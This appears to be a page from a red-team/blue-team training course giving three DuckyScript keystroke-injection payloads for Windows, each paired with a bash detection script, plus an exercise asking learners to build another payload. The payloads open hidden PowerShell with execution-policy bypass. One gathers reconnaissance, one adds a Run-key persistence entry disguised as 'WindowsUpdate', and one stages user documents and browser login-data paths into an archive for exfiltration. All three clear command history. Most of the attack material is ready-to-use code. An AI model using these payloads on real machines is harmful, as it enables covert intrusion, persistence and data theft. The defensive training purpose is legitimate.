# Maintenance Window Payloads (2-5 minutes)

## Overview

Maintenance window payloads are for extended access scenarios. They can perform comprehensive reconnaissance, establish persistence, and conduct cleanup operations.

---

## Payload: MW-01 - Full Reconnaissance Suite

**Execution Time:** ~90 seconds

```
REM Maintenance Window Payload 01: Full Recon
REM Time: ~90 seconds
REM Purpose: Comprehensive system reconnaissance

REM === Stage 1: Open PowerShell Hidden ===
DELAY 2000
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass
ENTER
DELAY 1500

REM === Stage 2: Define Output Location ===
STRINGLN $out = "$env:TEMP\.recon_$(Get-Date -Format 'yyyyMMdd_HHmmss').json"

REM === Stage 3: Collect System Information ===
STRINGLN $data = @{}
STRINGLN $data.Timestamp = Get-Date -Format o
STRINGLN $data.Hostname = $env:COMPUTERNAME
STRINGLN $data.Username = $env:USERNAME
STRINGLN $data.Domain = $env:USERDOMAIN
STRINGLN $data.OS = (Get-CimInstance Win32_OperatingSystem).Caption
STRINGLN $data.Architecture = $env:PROCESSOR_ARCHITECTURE

REM === Stage 4: Network Information ===
STRINGLN $data.IPAddresses = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notmatch 'Loopback'} | Select-Object IPAddress, InterfaceAlias)
STRINGLN $data.DNSServers = (Get-DnsClientServerAddress | Select-Object -ExpandProperty ServerAddresses)

REM === Stage 5: Installed Software ===
STRINGLN $data.Software = (Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion | Where-Object {$_.DisplayName})

REM === Stage 6: Running Processes ===
STRINGLN $data.Processes = (Get-Process | Select-Object Name, Id, Path -First 20)

REM === Stage 7: Save Output ===
STRINGLN $data | ConvertTo-Json -Depth 3 | Out-File $out -Force

REM === Stage 8: Cleanup ===
STRINGLN Clear-History
STRINGLN exit
```

### Blue Team Detection Script

```bash
#!/bin/bash
#######################################
# MW-01 Detection Script
# Detect Full Recon Payload Artifacts
#######################################

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${YELLOW}[*] Scanning for Maintenance Window Recon artifacts...${NC}"

ALERTS=0

# Check for recon JSON files in temp
echo "[*] Checking for recon output files..."
RECON_FILES=$(find /tmp -name ".recon_*.json" -o -name "*recon*.json" 2>/dev/null)
if [ -n "$RECON_FILES" ]; then
    echo -e "${RED}[ALERT] Recon files found:${NC}"
    echo "$RECON_FILES"
    ((ALERTS++))
fi

# Check for PowerShell execution patterns
echo "[*] Checking for suspicious PowerShell patterns..."
if grep -rq "Get-CimInstance\|Get-NetIPAddress\|HKLM:" /var/log/ 2>/dev/null; then
    echo -e "${RED}[ALERT] Recon commands in logs${NC}"
    ((ALERTS++))
fi

# Summary
echo ""
if [ $ALERTS -gt 0 ]; then
    echo -e "${RED}[!] $ALERTS potential indicators found${NC}"
else
    echo -e "${GREEN}[✓] No obvious recon artifacts detected${NC}"
fi
```

---

## Payload: MW-02 - Persistence Installer

**Execution Time:** ~60 seconds

```
REM Maintenance Window Payload 02: Persistence
REM Time: ~60 seconds
REM Purpose: Establish persistence mechanism

DELAY 2000
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass
ENTER
DELAY 1500

REM === Create Persistence Script ===
STRINGLN $persist = @'
# Persistence payload - runs at each login
$beacon = "http://placeholder.local/beacon"
# In training, this just logs activity
"Persistence active: $(Get-Date)" | Out-File "$env:TEMP\.persist_log" -Append
'@

STRINGLN $persist | Out-File "$env:TEMP\.update.ps1" -Force

REM === Install via Registry Run Key ===
STRINGLN $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
STRINGLN Set-ItemProperty -Path $regPath -Name "WindowsUpdate" -Value "powershell -w hidden -ep bypass -f $env:TEMP\.update.ps1"

REM === Verify Installation ===
STRINGLN $check = Get-ItemProperty -Path $regPath -Name "WindowsUpdate" -ErrorAction SilentlyContinue
STRINGLN if ($check) { "SUCCESS" | Out-File "$env:TEMP\.persist_status" }

REM === Cleanup ===
STRINGLN Clear-History
STRINGLN exit
```

### Blue Team Detection & Removal Script

```bash
#!/bin/bash
#######################################
# MW-02 Detection and Removal Script
# Find and remove persistence mechanisms
#######################################

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${YELLOW}[*] Scanning for persistence mechanisms...${NC}"

# For Linux - check equivalent persistence locations
echo "[*] Checking cron persistence..."
CRON_PERSIST=$(crontab -l 2>/dev/null | grep -i "update\|beacon\|hidden")
if [ -n "$CRON_PERSIST" ]; then
    echo -e "${RED}[ALERT] Suspicious cron entry:${NC}"
    echo "$CRON_PERSIST"
fi

echo "[*] Checking bashrc persistence..."
BASHRC_PERSIST=$(grep -E "\.ps1|beacon|hidden" ~/.bashrc 2>/dev/null)
if [ -n "$BASHRC_PERSIST" ]; then
    echo -e "${RED}[ALERT] Suspicious bashrc entry:${NC}"
    echo "$BASHRC_PERSIST"
fi

echo "[*] Checking for persist log files..."
find /tmp -name "*persist*" -type f 2>/dev/null

echo "[*] Checking systemd user services..."
ls -la ~/.config/systemd/user/*.service 2>/dev/null

echo ""
echo -e "${YELLOW}[*] Removal commands (run manually after review):${NC}"
echo "  crontab -e  # Remove suspicious entries"
echo "  nano ~/.bashrc  # Remove suspicious lines"
echo "  rm ~/.config/systemd/user/malicious.service"
```

---

## Payload: MW-03 - Data Exfiltration Prep

**Execution Time:** ~120 seconds

```
REM Maintenance Window Payload 03: Data Staging
REM Time: ~120 seconds
REM Purpose: Stage sensitive data for exfiltration

DELAY 2000
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass
ENTER
DELAY 1500

REM === Create staging directory ===
STRINGLN $stage = "$env:TEMP\.stage_$(Get-Random)"
STRINGLN New-Item -ItemType Directory -Path $stage -Force | Out-Null

REM === Collect Documents ===
STRINGLN Get-ChildItem "$env:USERPROFILE\Documents" -Recurse -Include *.docx,*.xlsx,*.pdf -ErrorAction SilentlyContinue | Select-Object -First 10 | ForEach-Object { Copy-Item $_.FullName $stage }

REM === Collect Browser Data Paths (not actual theft) ===
STRINGLN @{
STRINGLN   Chrome = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
STRINGLN   Firefox = "$env:APPDATA\Mozilla\Firefox\Profiles"
STRINGLN   Edge = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
STRINGLN } | ConvertTo-Json | Out-File "$stage\browser_paths.json"

REM === Create Archive ===
STRINGLN Compress-Archive -Path $stage -DestinationPath "$env:TEMP\.staged_data.zip" -Force

REM === Cleanup staging ===
STRINGLN Remove-Item $stage -Recurse -Force
STRINGLN Clear-History
STRINGLN exit
```

### Blue Team Detection Script

```bash
#!/bin/bash
#######################################
# MW-03 Detection Script
# Detect Data Staging Activity
#######################################

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${YELLOW}[*] Scanning for data staging artifacts...${NC}"

# Check for staged archives
echo "[*] Checking for staged archives..."
ARCHIVES=$(find /tmp -name "*.zip" -o -name "*.tar.gz" -o -name "staged*" 2>/dev/null)
if [ -n "$ARCHIVES" ]; then
    echo -e "${RED}[ALERT] Potential staged data:${NC}"
    for archive in $ARCHIVES; do
        echo "  File: $archive"
        echo "  Size: $(ls -lh "$archive" | awk '{print $5}')"
        echo "  Modified: $(stat -c %y "$archive" 2>/dev/null)"
    done
fi

# Check for hidden directories
echo "[*] Checking for hidden staging directories..."
find /tmp -type d -name ".*stage*" 2>/dev/null

# Check for document copies in temp
echo "[*] Checking for document copies in temp..."
find /tmp -name "*.docx" -o -name "*.xlsx" -o -name "*.pdf" 2>/dev/null | head -10

echo ""
echo -e "${YELLOW}[*] Prevention Recommendations:${NC}"
echo "  - Enable DLP (Data Loss Prevention)"
echo "  - Monitor file copy operations to temp"
echo "  - Alert on archive creation in user temp directories"
```

---

## Training Exercise: Build a Maintenance Window Payload

### Challenge
Create a payload that:
1. Opens hidden PowerShell
2. Collects a list of installed browsers
3. Gets the last 5 login events (simulated)
4. Saves to a hidden JSON file
5. Cleans up history
6. Total time under 60 seconds

### Template
```
REM YOUR MAINTENANCE WINDOW PAYLOAD
REM Objective: Browser and login enumeration
REM Time limit: 60 seconds

REM Stage 1: Open PowerShell
DELAY ____
GUI r
DELAY ____
STRING ________________________________
ENTER
DELAY ____

REM Stage 2: Collect data
STRINGLN # Your collection code here

REM Stage 3: Save output
STRINGLN # Your save code here

REM Stage 4: Cleanup
STRINGLN Clear-History
STRINGLN exit
```

### Then Create Detection Script
```bash
#!/bin/bash
# Your Blue Team detection script
# Detect the artifacts from your payload

echo "[*] Detecting artifacts from my payload..."

# TODO: Add your detection logic based on what your payload creates
```

---

[← Back to Deployment Strategies](README.md) | [Next: Unattended Access →](Unattended_Access_Payloads.md)
